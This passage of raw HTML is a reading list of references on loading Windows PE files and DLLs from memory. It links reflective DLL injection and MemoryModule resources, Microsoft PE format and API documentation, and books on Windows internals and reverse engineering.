contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/stephenfewer/ReflectiveDLLInjection">stephenfewer/ReflectiveDLLInjection (GitHub)<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_jdkf58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_jdkf58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li></ul></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">ired.team — Manual mapping / PE loader notes</strong></p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Overview: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection">Reflective DLL Injection<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_16pkn58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_16pkn58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Supporting technique: Dynamically Resolve API Addresses via PEB <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/cpp/build/getprocaddress?view=msvc-170">Microsoft Learn<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_16qkn58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_16qkn58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li></ul></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">MemoryModule (Joachim Bauch) — “Load a DLL from memory” library &amp; tutorial</strong></p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Library: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/fancycode/MemoryModule">fancycode/MemoryModule (GitHub)<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_16pkv58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_16pkv58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Tutorial: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/">Loading a DLL from memory (joachim-bauch.de)<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_16qkv58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_16qkv58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li></ul></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">Microsoft Learn — PE/COFF spec, IMAGE</strong> structures, loader-relevant APIs_*</p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">PE/COFF spec: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">PE Format<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_2apl758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_2apl758qav5ukqiv5ubsnpfivb_)"></rect></svg></a> <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format">Microsoft Learn<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_2cpl758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_2cpl758qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">IMAGE headers: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32">IMAGE_NT_HEADERS32<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4iql758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4iql758qav5ukqiv5ubsnpfivb_)"></rect></svg></a> · <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64">IMAGE_NT_HEADERS64<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4kql758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4kql758qav5ukqiv5ubsnpfivb_)"></rect></svg></a> · <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">IMAGE_FILE_HEADER<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4mql758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4mql758qav5ukqiv5ubsnpfivb_)"></rect></svg></a> <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32">Microsoft Learn<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4oql758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4oql758qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">APIs: VirtualAlloc · <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_2arl758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_2arl758qav5ukqiv5ubsnpfivb_)"></rect></svg></a> · CreateProcessA · <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe">CreatePipe<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_2crl758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_2crl758qav5ukqiv5ubsnpfivb_)"></rect></svg></a> <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe">Microsoft Learn<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_2erl758qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_2erl758qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li></ul></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">Windows Internals, Part 1 (7th Edition)</strong></p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Publisher page: Windows Internals, Part 1, 7th Edition (Microsoft Press Store) <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188">Microsoft Press Store<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_jdlf58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_jdlf58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li></ul></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">Practical Reverse Engineering (Dang, Gazet, Bachaalany, Josse)</strong></p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Publisher page: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.wiley.com/en-us/Practical+Reverse+Engineering%3A+x86%2C+x64%2C+ARM%2C+Windows+Kernel%2C+Reversing+Tools%2C+and+Obfuscation-p-9781118787311">Practical Reverse Engineering (Wiley)<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_15dln58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_15dln58qav5ukqiv5ubsnpfivb_)"></rect></svg></a> <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.wiley.com/en-us/Practical%2BReverse%2BEngineering%3A%2Bx86%2C%2Bx64%2C%2BARM%2C%2BWindows%2BKernel%2C%2BReversing%2BTools%2C%2Band%2BObfuscation-p-9781118787311">Wiley<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_16dln58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_16dln58qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li></ul></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">Think Like a Programmer (V. Anton Spraul)</strong></p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Publisher page: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://nostarch.com/thinklikeaprogrammer">Think Like a Programmer (No Starch Press)<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_jdlv58qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" 